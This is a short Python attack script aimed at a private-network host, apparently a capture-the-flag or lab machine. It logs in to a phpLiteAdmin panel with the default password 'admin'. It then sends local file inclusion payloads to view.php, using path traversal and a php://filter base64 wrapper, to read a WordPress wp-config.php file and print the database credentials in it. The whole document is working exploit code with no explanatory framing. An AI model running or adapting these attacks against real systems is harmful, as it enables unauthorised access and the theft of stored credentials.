import urllib.request, urllib.parse, socket, re, http.cookiejar
socket.setdefaulttimeout(15)
base = "http://192.168.18.132"

print("=== Testing phpLiteAdmin Login (admin) ===")
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Get login page and extract any CSRF token
login_url = base + "/dbadmin/test_db.php"
try:
    req = urllib.request.Request(login_url, headers={"User-Agent": "Mozilla/5.0"})
    resp = opener.open(req, timeout=10)
    content = resp.read().decode("utf-8", errors="ignore")
    
    # Check login_required
    if "password" in content.lower() and "login" in content.lower():
        print("Login form detected, trying password: admin")
        
        # Post login
        post_data = urllib.parse.urlencode({"password": "admin", "login": "Login"}).encode()
        req2 = urllib.request.Request(login_url, data=post_data, headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        resp2 = opener.open(req2, timeout=10)
        content2 = resp2.read().decode("utf-8", errors="ignore")
        
        if "logout" in content2.lower() or "database" in content2.lower():
            print("[SUCCESS] Logged in with admin!")
            print(f"Cookies: {[c.name for c in cj]}")
            # Look for info
            if "info" in content2.lower():
                print("  -> Info section found")
            # Extract any visible tables/databases
            dbs = re.findall(r'db|database|table', content2, re.I)
            print(f"  DB mentions: {len(dbs)}")
        else:
            print(f"Login response: {content2[:300]}")
except Exception as e:
    print(f"Error: {e}")

# Test LFI with different path variations
print("\n=== Testing LFI variations ===")
lfi_paths = [
    "page=....//....//....//home/zico/wordpress/wp-config.php",
    "page=/home/zico/wordpress/wp-config.php",
    "page=php://filter/convert.base64-encode/resource=/home/zico/wordpress/wp-config.php",
]

for payload in lfi_paths:
    try:
        url = base + "/view.php?" + payload
        req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        content = resp.read().decode("utf-8", errors="ignore")
        if len(content) > 50 and "error" not in content.lower():
            print(f"[OK] {payload[:60]}")
            if "DB_" in content or "password" in content.lower():
                print(f"  Content: {content[:200]}")
        else:
            print(f"[--] {payload[:60]}: {len(content)} bytes")
    except Exception as e:
        print(f"[--] {payload[:60]}: {str(e)[:50]}")
